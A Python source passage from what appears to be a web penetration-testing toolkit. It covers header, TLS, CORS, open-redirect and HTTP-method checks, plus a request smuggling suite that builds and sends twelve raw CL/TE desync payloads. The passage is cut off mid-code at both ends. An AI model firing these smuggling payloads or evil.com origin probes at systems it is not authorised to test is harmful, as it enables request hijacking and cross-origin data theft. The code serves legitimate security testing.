HDR_SECURITY_HEADERS = {
    "X-XSS-Protection": "Deprecated header; should not be used.",
    "X-Frame-Options": "Protects against clickjacking.",
    "X-Content-Type-Options": "Prevents MIME type sniffing.",
    "Content-Security-Policy": "Mitigates XSS and data injection.",
    "Strict-Transport-Security": "Enforces HTTPS via HSTS.",
    "Referrer-Policy": "Controls referrer information leakage.",
    "Permissions-Policy": "Restricts powerful browser features.",
    "Cross-Origin-Resource-Policy": "Prevents cross-origin data leaks.",
    "Cross-Origin-Opener-Policy": "Isolates browsing contexts.",
    "Cross-Origin-Embedder-Policy": "Enforces secure embedding.",
}


def hdr_normalize_url(url: str) -> str:
    parsed = urlparse(url)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))


def run_headers_check() -> None:
    print("=== Headers Attacker ===")
    print("Paste your list of URLs (one per line). End input with an empty line.\n")

    urls: List[str] = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if not line.strip():
            break
        urls.append(line.strip())

    if not urls:
        print("No URLs provided.")
        return

    unique_urls: Dict[str, str] = {}
    for u in urls:
        base = hdr_normalize_url(u)
        if base not in unique_urls:
            unique_urls[base] = u

    print(f"\n[+] {len(urls)} URLs provided, reduced to {len(unique_urls)} unique base paths.\n")

    print("Do you need authentication headers?")
    print("1. No authentication")
    print("2. Bearer token")
    print("3. Cookie")
    auth_choice = input("Enter choice number: ").strip()

    headers: Dict[str, str] = {}
    if auth_choice == "2":
        token = input("Enter Bearer token: ").strip()
        headers["Authorization"] = f"Bearer {token}"
    elif auth_choice == "3":
        cookie = input("Enter Cookie string: ").strip()
        headers["Cookie"] = cookie

    print("\nChoose output format:")
    print("1. Group by misconfigured header -> list URLs beneath each header")
    print("2. Group by URL -> list misconfigured headers for each target")
    output_choice = input("Enter choice number: ").strip()

    print("\nFor Option 1, how should URLs be displayed?")
    print("1. Plain URLs only")
    print("2. URLs with brackets showing what was misconfigured/missing")
    url_display_choice = input("Enter choice number: ").strip()

    print("\n[+] Starting header misconfiguration scan...\n")

    results_by_url: Dict[str, List[str]] = {}
    results_by_header: Dict[str, List[Tuple[str, str]]] = defaultdict(list)

    for base, representative_url in unique_urls.items():
        try:
            resp = requests.get(representative_url, headers=headers, timeout=10, verify=False)
            found_headers = resp.headers
            issues: List[str] = []

            for header, _ in HDR_SECURITY_HEADERS.items():
                if header == "X-XSS-Protection":
                    if header in found_headers:
                        val = found_headers[header]
                        issues.append(f"{header} -> Present (deprecated, value '{val}')")
                        results_by_header[header].append((representative_url, f"Present '{val}'"))
                    continue

                if header not in found_headers:
                    issues.append(f"{header} -> Missing")
                    results_by_header[header].append((representative_url, "Missing"))
                else:
                    val = found_headers[header]
                    misconfigured = None
                    if header == "X-Frame-Options" and val.lower() not in ["deny", "sameorigin"]:
                        misconfigured = f"Value '{val}'"
                    elif header == "X-Content-Type-Options" and val.lower() != "nosniff":
                        misconfigured = f"Value '{val}'"
                    elif header == "Strict-Transport-Security":
                        if "max-age" not in val:
                            misconfigured = "Missing max-age"
                        else:
                            try:
                                age = int(val.split("max-age=")[1].split(";")[0])
                                if age < 15552000:
                                    misconfigured = f"max-age too low ({age})"
                            except Exception:
                                misconfigured = "Invalid max-age format"
                        if "includeSubDomains" not in val:
                            misconfigured = "Missing includeSubDomains"
                        if "preload" not in val:
                            misconfigured = "Missing preload"
                    elif header == "Content-Security-Policy":
                        if "default-src" not in val:
                            misconfigured = "Missing default-src"
                        if "unsafe-inline" in val:
                            misconfigured = "Contains unsafe-inline"
                        if "unsafe-eval" in val:
                            misconfigured = "Contains unsafe-eval"
                        if "*" in val:
                            misconfigured = "Overly permissive wildcard"

                    if misconfigured:
                        issues.append(f"{header} -> Misconfigured ({misconfigured})")
                        results_by_header[header].append((representative_url, misconfigured))

            results_by_url[representative_url] = issues if issues else ["No obvious misconfigurations detected."]

        except Exception as e:
            results_by_url[representative_url] = [f"Error fetching URL: {e}"]

    print("\n=== Scan Results ===\n")

    if output_choice == "1":
        for header, url_details in results_by_header.items():
            print(f"{Fore.RED}{header}{Style.RESET_ALL}")
            for u, detail in url_details:
                if url_display_choice == "2":
                    print(f"  - {u} ({detail})")
                else:
                    print(f"  - {u}")
            print()
    else:
        for url, issues in results_by_url.items():
            print(f"Target: {url}")
            for issue in issues:
                print(f"  - {issue}")
            print()

    print("[+] Scan complete.")


# ===========================================================================
# TOOL 4: SSL / TLS Audit
# ===========================================================================
SSL_LOCAL_CVE_MAP = {
    "rc4": [
        "CVE-2013-2566: RC4 biases allow plaintext recovery",
        "CVE-2015-2808: RC4 stream cipher deemed insecure",
    ],
    "3des": ["CVE-2016-2183: SWEET32 (64-bit block ciphers like 3DES)"],
    "cbc": [
        "CVE-2011-3389: BEAST attack against TLS CBC",
        "CVE-2014-3566: POODLE attack against SSLv3 CBC",
    ],
    "sha1": ["CVE-2017-18217: SHA-1 collision attacks (legacy signatures/MACs)"],
    "md5": ["CVE-2008-2100: MD5 certificate forgery / collisions"],
    "null": ["NULL cipher suites provide no encryption"],
    "export": ["EXPORT cipher suites are weak by design"],
}


def ssl_parse_host(target: str) -> Tuple[str, int]:
    p = urlparse(target.strip())
    host = p.hostname or target.strip()
    port = p.port or 443
    return host, port


def ssl_is_weak(cipher_name: str) -> bool:
    n = cipher_name.lower()
    return (
        "rc4" in n or "3des" in n or "des-" in n or "cbc" in n or "md5" in n
        or "null" in n or "export" in n
        or ("sha" in n and "sha256" not in n and "sha384" not in n and "sha512" not in n)
    )


def ssl_get_local_cves(cipher_name: str) -> List[str]:
    n = cipher_name.lower()
    out: List[str] = []
    for key, cves in SSL_LOCAL_CVE_MAP.items():
        if key in n:
            out.extend(cves)
    return out


def ssl_dial(host: str, port: int, ctx: ssl.SSLContext, server_hostname: str) -> ssl.SSLSocket:
    sock = socket.create_connection((host, port), timeout=6)
    return ctx.wrap_socket(sock, server_hostname=server_hostname)


def ssl_check_protocols(host: str, port: int) -> None:
    print(f"\n{Fore.MAGENTA}=== Protocol Support ==={Style.RESET_ALL}")
    versions = [
        ("TLSv1.0", getattr(ssl.TLSVersion, "TLSv1", None)),
        ("TLSv1.1", getattr(ssl.TLSVersion, "TLSv1_1", None)),
        ("TLSv1.2", getattr(ssl.TLSVersion, "TLSv1_2", None)),
        ("TLSv1.3", getattr(ssl.TLSVersion, "TLSv1_3", None)),
    ]
    for name, ver in versions:
        if ver is None:
            print(f"  - {name}: {Fore.YELLOW}UNKNOWN{Style.RESET_ALL}")
            continue
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ver
            ctx.maximum_version = ver
            ssock = ssl_dial(host, port, ctx, host)
            try:
                print(f"  - {name}: {Fore.GREEN}SUPPORTED{Style.RESET_ALL} (negotiated: {ssock.version()})")
            finally:
                ssock.close()
        except Exception:
            print(f"  - {name}: {Fore.RED}NOT SUPPORTED{Style.RESET_ALL}")


def ssl_check_certificate(host: str, port: int) -> None:
    print(f"\n{Fore.MAGENTA}=== Certificate Checks ==={Style.RESET_ALL}")
    if not _HAS_CRYPTOGRAPHY:
        print(f"  {Fore.YELLOW}cryptography package not available; skipping detailed cert parsing.{Style.RESET_ALL}")
        return
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=6) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                der_cert = ssock.getpeercert(True)
        pem_cert = ssl.DER_cert_to_PEM_cert(der_cert)
        cert = x509.load_pem_x509_certificate(pem_cert.encode(), default_backend())
        print(f"  - Subject: {cert.subject.rfc4514_string()}")
        print(f"  - Issuer:  {cert.issuer.rfc4514_string()}")
        try:
            exp = cert.not_valid_after_utc
        except Exception:
            exp = cert.not_valid_after.replace(tzinfo=timezone.utc)
        print(f"  - Expires: {exp}")
        if exp < datetime.now(timezone.utc):
            print(f"    {Fore.RED}Certificate expired!{Style.RESET_ALL}")
        sigalg = cert.signature_hash_algorithm.name if cert.signature_hash_algorithm else "unknown"
        print(f"  - Signature Algorithm: {sigalg}")
        if sigalg.lower() in ("sha1", "md5"):
            print(f"    {Fore.RED}Weak signature algorithm!{Style.RESET_ALL}")
        try:
            ks = cert.public_key().key_size
            print(f"  - Key Size: {ks} bits")
            if ks < 2048:
                print(f"    {Fore.RED}Weak key size (<2048)!{Style.RESET_ALL}")
        except Exception:
            pass
    except Exception as e:
        print(f"  {Fore.RED}Failed to read certificate: {e}{Style.RESET_ALL}")


def ssl_shared_ciphers_tls12(host: str, port: int) -> List[str]:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.minimum_version = ssl.TLSVersion.TLSv1
    ctx.maximum_version = ssl.TLSVersion.TLSv1_2
    ssock = ssl_dial(host, port, ctx, host)
    try:
        c = ssock.shared_ciphers() or []
        return [x[0] for x in c if x and x[0]]
    finally:
        ssock.close()


def ssl_tls13_cipher_enum(host: str, port: int) -> Tuple[Set[str], Optional[str]]:
    common = [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "TLS_AES_128_CCM_SHA256",
        "TLS_AES_128_CCM_8_SHA256",
    ]
    supported: Set[str] = set()
    note: Optional[str] = None

    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.maximum_version = ssl.TLSVersion.TLSv1_3
        ssock = ssl_dial(host, port, ctx, host)
        try:
            if (ssock.version() or "").startswith("TLSv1.3"):
                c = ssock.cipher()
                if c and c[0]:
                    supported.add(c[0])
        finally:
            ssock.close()
    except Exception:
        pass

    if not hasattr(ssl.SSLContext, "set_ciphersuites"):
        note = "Runtime does not support set_ciphersuites(); listing negotiated TLS 1.3 cipher only."
        return supported, note

    for cs in common:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ssl.TLSVersion.TLSv1_3
            ctx.maximum_version = ssl.TLSVersion.TLSv1_3
            ctx.set_ciphersuites(cs)
            ssock = ssl_dial(host, port, ctx, host)
            try:
                if (ssock.version() or "").startswith("TLSv1.3"):
                    c = ssock.cipher()
                    if c and c[0] == cs:
                        supported.add(cs)
            finally:
                ssock.close()
        except Exception:
            continue

    return supported, note


def ssl_check_ciphers(host: str, port: int) -> None:
    print(f"\n{Fore.MAGENTA}=== Cipher Enumeration ==={Style.RESET_ALL}")
    strong: Set[str] = set()
    weak: Set[str] = set()

    try:
        tls12 = ssl_shared_ciphers_tls12(host, port)
        for c in tls12:
            (weak if ssl_is_weak(c) else strong).add(c)
    except Exception as e:
        print(f"  {Fore.YELLOW}TLS<=1.2 cipher list unavailable: {e}{Style.RESET_ALL}")

    tls13, note = ssl_tls13_cipher_enum(host, port)
    for c in tls13:
        (weak if ssl_is_weak(c) else strong).add(c)

    if note:
        print(f"  {Fore.YELLOW}{note}{Style.RESET_ALL}")

    print(f"\n{Fore.BLUE}{Style.BRIGHT}=== Cipher Summary ==={Style.RESET_ALL}\n")

    print(f"{Fore.GREEN}Strong Ciphers:{Style.RESET_ALL}")
    print("  - None" if not strong else "\n".join(f"  - {c}" for c in sorted(strong)))

    print(f"\n{Fore.RED}Weak Ciphers:{Style.RESET_ALL}")
    if not weak:
        print("  - None")
    else:
        for c in sorted(weak):
            print(f"  - {c}")
            for cv in ssl_get_local_cves(c)[:3]:
                print(f"      {Fore.YELLOW}{cv}{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}Total unique supported ciphers observed: {len(strong) + len(weak)}{Style.RESET_ALL}")


def run_ssl_enum() -> None:
    target = input(f"{Fore.CYAN}Enter target URL (e.g. https://example.com): {Style.RESET_ALL}").strip()
    host, port = ssl_parse_host(target)
    print(f"\n[+] Target: {Fore.CYAN}{host}:{port}{Style.RESET_ALL}")
    ssl_check_protocols(host, port)
    ssl_check_certificate(host, port)
    ssl_check_ciphers(host, port)
    print(f"\n{Fore.BLUE}{Style.BRIGHT}=== Audit Complete ==={Style.RESET_ALL}")


# ===========================================================================
# TOOL 5: Request Smuggling
# ===========================================================================
def smug_make_inner_request(method: str, path: str, host_header: str) -> str:
    return f"{method} {path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"


def smug_recv_all(sock, timeout: int = 4) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except socket.timeout:
        pass
    return b"".join(chunks)


def smug_dial(host: str, port: int, use_tls: bool, cafile: Optional[str], disable_verify: bool):
    raw = socket.create_connection((host, port), timeout=8)
    if not use_tls:
        return raw
    if disable_verify:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    else:
        ctx = ssl.create_default_context(cafile=cafile) if cafile else ssl.create_default_context()
    return ctx.wrap_socket(raw, server_hostname=host)


def smug_send_raw(connect_host, connect_port, payload_bytes, use_tls=False, cafile=None, disable_verify=True):
    s = smug_dial(connect_host, connect_port, use_tls, cafile, disable_verify)
    s.sendall(payload_bytes)
    resp = smug_recv_all(s)
    s.close()
    return resp


def smug_classify_response(resp_bytes: bytes) -> str:
    text = resp_bytes.decode(errors="ignore")
    if "HTTP/1.1 2" in text or "HTTP/1.0 2" in text:
        return "Successful"
    if "HTTP/1.1 3" in text:
        return "Interesting"
    if "HTTP/1.1 4" in text or "HTTP/1.1 5" in text:
        return "Failed"
    if "Burp Suite" in text:
        return "Interesting"
    return "Interesting" if text else "Failed"


def smug_build_cl_te_mismatch(host_header, inner_req, path="/"):
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "Content-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
        "0\r\n\r\n"
    ).encode() + inner_req.encode()


def smug_build_te_cl_reverse(host_header, inner_req, path="/"):
    body = "1\r\nX\r\n0\r\n\r\n"
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "Transfer-Encoding: chunked\r\nContent-Length: 5\r\nConnection: keep-alive\r\n\r\n"
        f"{body}"
    ).encode() + inner_req.encode()


def smug_build_duplicate_cl(host_header, inner_req, path="/"):
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "Content-Length: 4\r\nContent-Length: 100\r\nConnection: keep-alive\r\n\r\n"
        "TEST\r\n\r\n"
    ).encode() + inner_req.encode()


def smug_build_embedded_direct(host_header, inner_req, path="/"):
    body = inner_req
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n"
        f"{body}"
    ).encode()


def smug_build_te_obfuscated(host_header, inner_req, path="/"):
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "Transfer-Encoding:    chunked\r\nTransfer-Encoding: chunked;foo=bar\r\n"
        "Connection: keep-alive\r\n\r\n0\r\n\r\n"
    ).encode() + inner_req.encode()


def smug_build_lf_termination(host_header, inner_req, path="/"):
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\n\n"
    ).encode() + inner_req.encode()


def smug_build_space_in_method(host_header, inner_req_path, path="/"):
    inner = f"GET {inner_req_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
    inner = " " + inner
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        f"Content-Length: {len(inner)}\r\nConnection: keep-alive\r\n\r\n"
        f"{inner}"
    ).encode()


def smug_build_header_folding(host_header, inner_req, path="/"):
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "Transfer-Encoding:\tchunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\n"
    ).encode() + inner_req.encode()


def smug_build_duplicate_te(host_header, inner_req, path="/"):
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n"
        "Connection: keep-alive\r\n\r\n0\r\n\r\n"
    ).encode() + inner_req.encode()


def smug_build_chunk_size_tamper(host_header, inner_req, path="/"):
    body = "A\r\nXXXXXXXXXX\r\n0\r\n\r\n"
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
        f"{body}"
    ).encode() + inner_req.encode()


def smug_build_te_uppercase(host_header, inner_req, path="/"):
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "Transfer-Encoding: CHUNKED\r\nConnection: keep-alive\r\n\r\n0\r\n\r\n"
    ).encode() + inner_req.encode()


def smug_build_crlf_in_header(host_header, inner_req, path="/"):
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
        "X-Header: value\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\n"
    ).encode() + inner_req.encode()


SMUG_TECHNIQUES = [
    ("CL_TE mismatch", smug_build_cl_te_mismatch),
    ("TE_CL reverse", smug_build_te_cl_reverse),
    ("Duplicate Content-Length", smug_build_duplicate_cl),
    ("Embedded direct", smug_build_embedded_direct),
    ("Obfuscated TE", smug_build_te_obfuscated),
    ("LF termination", smug_build_lf_termination),
    ("Space in inner method", smug_build_space_in_method),
    ("Header folding (obsolete)", smug_build_header_folding),
    ("Duplicate Transfer-Encoding", smug_build_duplicate_te),
    ("Chunk size tamper (hex)", smug_build_chunk_size_tamper),
    ("TE uppercase", smug_build_te_uppercase),
    ("CRLF in header value", smug_build_crlf_in_header),
]


def smug_run_suite(connect_host, connect_port, target_host_header, scheme,
                   inner_method, inner_path, cafile, disable_verify):
    print(Fore.MAGENTA + Style.BRIGHT + "\n=== Running request smuggling suite ===" + Style.RESET_ALL)
    use_tls = (scheme == "https")
    results = {"Successful": [], "Interesting": [], "Failed": []}

    for name, builder in SMUG_TECHNIQUES:
        try:
            if builder == smug_build_space_in_method:
                payload = builder(target_host_header, inner_path)
            else:
                inner = smug_make_inner_request(inner_method, inner_path, target_host_header)
                payload = builder(target_host_header, inner)

            print(Fore.YELLOW + f"\n--- Technique: {name} ---" + Style.RESET_ALL)
            print(payload.decode(errors="ignore"))

            resp = smug_send_raw(connect_host, connect_port, payload,
                                 use_tls=use_tls, cafile=cafile, disable_verify=disable_verify)
            cls = smug_classify_response(resp)
            results[cls].append(name)

            print(Fore.CYAN + "\n=== Response (first 800 bytes) ===" + Style.RESET_ALL)
            print(resp[:800].decode(errors="ignore"))
        except Exception as e:
            print(Fore.RED + f"[!] Error during {name}: {e}" + Style.RESET_ALL)
            results["Failed"].append(name)

    print(Fore.BLUE + Style.BRIGHT + "\n=== Smuggling Summary ===" + Style.RESET_ALL)
    for group in ["Successful", "Interesting", "Failed"]:
        items = results[group]
        col = Fore.GREEN if group == "Successful" else (Fore.YELLOW if group == "Interesting" else Fore.RED)
        print(f"{col}{group}:{Style.RESET_ALL}")
        if not items:
            print("  - None")
        else:
            for i in items:
                print(f"  - {i}")

    print(Fore.CYAN + f"\nCompleted at {datetime.now().isoformat(timespec='seconds')}" + Style.RESET_ALL)


def run_smuggling() -> None:
    print(Fore.MAGENTA + Style.BRIGHT + "\n=== Request Smuggling Exploitation ===\n" + Style.RESET_ALL)

    target_url = input("Target URL (e.g. https://www.example.com/): ").strip()
    parsed = urlparse(target_url if "://" in target_url else ("https://" + target_url))
    scheme = parsed.scheme.lower()
    host = parsed.hostname or ""
    port = parsed.port or (443 if scheme == "https" else 80)
    base_path = parsed.path or "/"

    print(f"\nTarget parsed -> Scheme: {scheme} | Host: {host} | Port: {port} | Base path: {base_path}")

    inner_method = input("Inner request method [default GET]: ").strip().upper() or "GET"
    inner_path = input(f"Inner request path [default {base_path}]: ").strip() or base_path

    proxy = input("Proxy for interception (ip:port) [blank = none]: ").strip()
    if proxy:
        try:
            ph, pp = proxy.split(":")
            connect_host, connect_port = ph, int(pp)
            print(f"[+] Using proxy {connect_host}:{connect_port} for TCP connect")
        except Exception:
            print(Fore.RED + "[!] Invalid proxy format. Use ip:port" + Style.RESET_ALL)
            return
    else:
        connect_host, connect_port = host, port
        print("[+] No proxy; connecting directly to origin")

    print("\nTLS trust options:")
    print("  1) Disable verification (easiest with Burp interception)")
    print("  2) Provide CA file for proper trust")
    trust_opt = input("Select [1/2, default 1]: ").strip() or "1"
    disable_verify = True
    cafile: Optional[str] = None
    if trust_opt == "2":
        cafile = input("Path to CA file: ").strip()
        disable_verify = False

    if scheme == "https":
        print(Fore.MAGENTA + Style.BRIGHT + "\n=== Running HTTPS suite ===" + Style.RESET_ALL)
        smug_run_suite(connect_host, connect_port, host, "https",
                       inner_method, inner_path, cafile, disable_verify)

        print(Fore.MAGENTA + Style.BRIGHT + "\n=== Running HTTP suite ===" + Style.RESET_ALL)
        smug_run_suite(connect_host, 80, host, "http",
                       inner_method, inner_path, cafile, True)
    else:
        smug_run_suite(connect_host, connect_port, host, "http",
                       inner_method, inner_path, cafile, True)


# ===========================================================================
# TOOL 6: CORS Misconfiguration Checks
# ===========================================================================
def cors_print_response_summary(resp) -> None:
    print(Fore.CYAN + f"\n=== Response from {resp.url} ===" + Style.RESET_ALL)
    print(f"Status: {resp.status_code}")
    print("Headers:")
    for k, v in resp.headers.items():
        print(f"  {k}: {v}")


def cors_classify(resp, origin_tested: str) -> List[str]:
    acao = resp.headers.get("Access-Control-Allow-Origin")
    acc = resp.headers.get("Access-Control-Allow-Credentials")
    issues = []
    if acao:
        if acao == origin_tested:
            issues.append("Origin reflected -> Potential CORS bypass")
        elif acao == "*":
            if acc and acc.lower() == "true":
                issues.append("Wildcard + credentials -> Critical misconfig")
            else:
                issues.append("Wildcard origin allowed")
        else:
            issues.append(f"Specific ACAO: {acao}")
    if acc and acc.lower() == "true":
        issues.append("Credentials allowed")
    return issues if issues else ["No obvious CORS issue"]


def cors_categorize(issues: List[str]) -> str:
    joined = " ".join(issues).lower()
    if "bypass" in joined or "critical" in joined:
        return "Successful"
    elif "wildcard" in joined or "credentials" in joined or "specific acao" in joined:
        return "Interesting"
    elif "error" in joined:
        return "Failed"
    return "Failed"


def cors_run_tests(url, host, method, cookies, headers, body_data):
    tests = [
        ("Malicious origin", "https://evil.com"),
        ("Null origin", "null"),
        ("Subdomain origin", f"https://evil.{host}"),
        ("Case variation", f"https://{host.upper()}"),
        ("Trailing slash", f"https://{host}/"),
        ("HTTP scheme", f"http://{host}"),
        ("Multiple origins", "https://evil.com https://another.com"),
    ]
    results = {"Successful": [], "Interesting": [], "Failed": []}

    for name, origin in tests:
        print(Fore.YELLOW + f"\n--- Test: {name} (Origin={origin}) ---" + Style.RESET_ALL)
        try:
            resp = requests.request(
                method, url,
                headers={**headers, "Origin": origin},
                cookies=cookies,
                data=body_data if method in ["POST", "PUT"] else None,
                timeout=8, verify=False,
            )
            cors_print_response_summary(resp)
            issues = cors_classify(resp, origin)
            category = cors_categorize(issues)
            results[category].append((name, issues))
            for issue in issues:
                col = Fore.GREEN if category == "Successful" else Fore.YELLOW
                print(col + f"[{'+' if category == 'Successful' else '!'}] {issue}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Error during {name}: {e}" + Style.RESET_ALL)
            results["Failed"].append((name, [f"Error: {e}"]))

    print(Fore.YELLOW + "\n--- Test: Preflight request ---" + Style.RESET_ALL)
    try:
        preflight_headers = {
            **headers, "Origin": "https://evil.com",
            "Access-Control-Request-Method": "PUT",
            "Access-Control-Request-Headers": "X-Custom-Header",
        }
        resp = requests.options(url, headers=preflight_headers, cookies=cookies, timeout=8, verify=False)
        cors_print_response_summary(resp)
        issues = []
        if "Access-Control-Allow-Methods" in resp.headers:
            issues.append(f"Allowed methods: {resp.headers['Access-Control-Allow-Methods']}")
        if "Access-Control-Allow-Headers" in resp.headers:
            issues.append(f"Allowed headers: {resp.headers['Access-Control-Allow-Headers']}")
        if not issues:
            issues = ["No obvious CORS issue"]
        category = cors_categorize(issues)
        results[category].append(("Preflight", issues))
        for issue in issues:
            col = Fore.GREEN if category == "Successful" else Fore.YELLOW
            print(col + f"[{'+' if category == 'Successful' else '!'}] {issue}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[!] Error during Preflight: {e}" + Style.RESET_ALL)
        results["Failed"].append(("Preflight", [f"Error: {e}"]))

    return results


def run_cors() -> None:
    print(Fore.MAGENTA + Style.BRIGHT + "\n=== Automated CORS Exploitation ===\n" + Style.RESET_ALL)

    target_url = input("Target URL (e.g. https://www.example.com/api): ").strip()
    parsed = urlparse(target_url if "://" in target_url else ("https://" + target_url))
    host = parsed.hostname or ""

    method = input("HTTP method to use (GET/POST/PUT) [default GET]: ").strip().upper() or "GET"

    body_data = None
    if method in ["POST", "PUT"]:
        print("\nEnter body data for the request (press Enter on blank line to finish):")
        lines = []
        while True:
            try:
                line = input()
            except EOFError:
                break
            if not line:
                break
            lines.append(line)
        body_data = "\n".join(lines)

    cookies: Dict[str, str] = {}
    print("\nEnter authentication cookies (name=value). Press Enter on blank line to finish:")
    while True:
        try:
            line = input("Cookie: ").strip()
        except EOFError:
            break
        if not line:
            break
        if "=" in line:
            name, value = line.split("=", 1)
            cookies[name.strip()] = value.strip()

    headers: Dict[str, str] = {}
    print("\nEnter additional headers (name:value). Press Enter on blank line to finish:")
    while True:
        try:
            line = input("Header: ").strip()
        except EOFError:
            break
        if not line:
            break
        if ":" in line:
            name, value = line.split(":", 1)
            headers[name.strip()] = value.strip()

    print(f"\nTarget parsed -> Host: {host} | URL: {target_url} | Method: {method}")
    results = cors_run_tests(target_url, host, method, cookies, headers, body_data)

    print(Fore.BLUE + Style.BRIGHT + "\n=== CORS Summary ===" + Style.RESET_ALL)
    for group in ["Successful", "Interesting", "Failed"]:
        col = Fore.GREEN if group == "Successful" else (Fore.YELLOW if group == "Interesting" else Fore.RED)
        print(f"{col}{group}:{Style.RESET_ALL}")
        if not results[group]:
            print("  - None")
        else:
            for test, issues in results[group]:
                print(f"  - {test}:")
                for issue in issues:
                    print(f"      * {issue}")

    print(Fore.CYAN + f"\nCompleted at {datetime.now().isoformat(timespec='seconds')}" + Style.RESET_ALL)


# ===========================================================================
# TOOL 7: Open Redirect Tester
# ===========================================================================
OR_REDIRECT_PARAMS = {
    "next", "url", "target", "dest", "destination", "redir", "redirect",
    "redirect_url", "redirect_uri", "return", "returnto", "return_to",
    "continue", "goto", "out", "view", "callback", "cb", "forward", "to",
    "uri", "path", "file", "redirectURL",
}
OR_PROBE_URL = "https://example.com/"


def or_test_url(u: str, timeout: int = 12) -> None:
    p = urlparse(u)
    if not p.scheme or not p.netloc:
        print(Fore.YELLOW + f"[!] Invalid URL: {u}" + Style.RESET_ALL)
        return

    params = parse_qsl(p.query, keep_blank_values=True)
    cand = [k for k, _ in params if k.lower() in OR_REDIRECT_PARAMS or k.lower().endswith(("_url", "_uri"))]
    if not cand:
        print(Fore.BLUE + f"[-] No redirect-like params: {u}" + Style.RESET_ALL)
        return

    print(Fore.MAGENTA + f"\n=== Testing: {u} ===" + Style.RESET_ALL)
    s = requests.Session()

    for k in sorted(set(cand)):
        mu = shared_rebuild_url(u, [(pk, (OR_PROBE_URL if pk == k else pv)) for pk, pv in params])
        try:
            r = s.get(mu, headers=shared_default_ua(), verify=False, timeout=timeout, allow_redirects=False)
        except Exception as e:
            print(Fore.YELLOW + f"  - {k}: request failed ({e})" + Style.RESET_ALL)
            continue

        loc = r.headers.get("Location", "")
        if r.status_code in (301, 302, 303, 307, 308) and loc:
            if "example.com" in loc:
                print(Fore.GREEN + f"  - {k}: POSSIBLE open redirect (Location -> {loc})" + Style.RESET_ALL)
            else:
                print(Fore.CYAN + f"  - {k}: redirect observed (Location -> {loc})" + Style.RESET_ALL)
        else:
            print(Fore.BLUE + f"  - {k}: no redirect (status {r.status_code})" + Style.RESET_ALL)


def run_open_redirect() -> None:
    print(Fore.CYAN + Style.BRIGHT + "\n=== Open Redirect Tester ===\n" + Style.RESET_ALL)
    urls = shared_collect_urls()
    if not urls:
        one = input("Enter a single URL to test: ").strip()
        if one:
            urls = [one]
    for u in urls:
        or_test_url(u)


# ===========================================================================
# TOOL 8: HTTP Methods / Dangerous Verbs Check
# ===========================================================================
HTTP_RISKY = {"TRACE", "TRACK", "PUT", "DELETE", "CONNECT"}


def http_run_check(url: str, timeout: int = 12) -> None:
    p = urlparse(url)
    if not p.scheme or not p.netloc:
        print(Fore.YELLOW + f"[!] Invalid URL: {url}" + Style.RESET_ALL)
        return

    s = requests.Session()
    headers = shared_default_ua()

    print(Fore.MAGENTA + f"\n=== {url} ===" + Style.RESET_ALL)
    try:
        r = s.options(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
    except Exception as e:
        print(Fore.YELLOW + f"[!] OPTIONS failed: {e}" + Style.RESET_ALL)
        return

    allow = r.headers.get("Allow") or r.headers.get("Access-Control-Allow-Methods") or ""
    allow_set = {m.strip().upper() for m in allow.split(",") if m.strip()}

    print(Fore.CYAN + f"Allow/ACAM: {allow or '(not provided)'}" + Style.RESET_ALL)

    risky = sorted([m for m in allow_set if m in HTTP_RISKY])
    if risky:
        print(Fore.RED + f"[!] Risky methods advertised: {', '.join(risky)}" + Style.RESET_ALL)

    for m in ["TRACE", "PUT", "DELETE"]:
        try:
